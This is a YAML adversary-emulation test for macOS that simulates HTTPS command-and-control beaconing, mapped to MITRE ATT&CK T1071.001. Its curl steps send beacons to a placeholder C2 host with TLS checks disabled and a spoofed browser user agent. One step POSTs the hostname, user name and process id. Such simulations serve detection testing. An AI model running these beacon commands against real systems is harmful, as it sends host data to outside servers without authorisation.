---
api_version: 2.0
uuid: 30c034c8-2d44-4df3-97b4-c2f446c4cbf2
name: HTTPS Beacon with Custom Headers
authors:
- Claude Code
description: |
  Simulates HTTPS beacon communication with custom headers for C2
mitre:
  tactics:
  - TA0011 Command and Control
  techniques:
  - T1071 Application Layer Protocol
  subtechniques:
  - 'T1071.001 Application Layer Protocol: Web Protocols'
requirements:
  platforms:
  - os: darwin
args:
- name: c2_url
  description: C2 server HTTPS URL
  type: string
  default: https://api.example.com
- name: api_key
  description: API key for authentication
  type: string
  default: secret-key-12345
- name: user_agent
  description: Custom user agent
  type: string
  default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
- name: beacon_path
  description: Beacon endpoint
  type: string
  default: /beacon
- name: timeout
  description: Request timeout in seconds
  type: integer
  default: 10
steps:
- name: https_beacon_with_headers
  description: Send HTTPS beacon with custom headers
  inline: |
    curl -s -k --max-time {{ .Args.timeout }} \
      -A "{{ .Args.user_agent }}" \
      -H "Authorization: Bearer {{ .Args.api_key }}" \
      -H "X-Beacon-ID: $(uuidgen)" \
      -H "X-System-Info: macOS" \
      "{{ .Args.c2_url }}{{ .Args.beacon_path }}" \
      -w "\nHTTP Status: %{http_code}\n"
- name: https_beacon_post
  description: POST beacon with system metadata
  inline: |
    curl -s -k --max-time {{ .Args.timeout }} \
      -X POST "{{ .Args.c2_url }}{{ .Args.beacon_path }}" \
      -A "{{ .Args.user_agent }}" \
      -H "Authorization: Bearer {{ .Args.api_key }}" \
      -H "Content-Type: application/json" \
      -H "X-UUID: $(uuidgen)" \
      -d "{\"hostname\":\"$(hostname)\",\"user\":\"$(whoami)\",\"pid\":\"$$\"}" \
      -w "\nHTTP Status: %{http_code}\n"
  cleanup:
    inline: rm -f ~/.curl/* 2>/dev/null || true
tests:
- name: dry_run_test
  dry_run: true
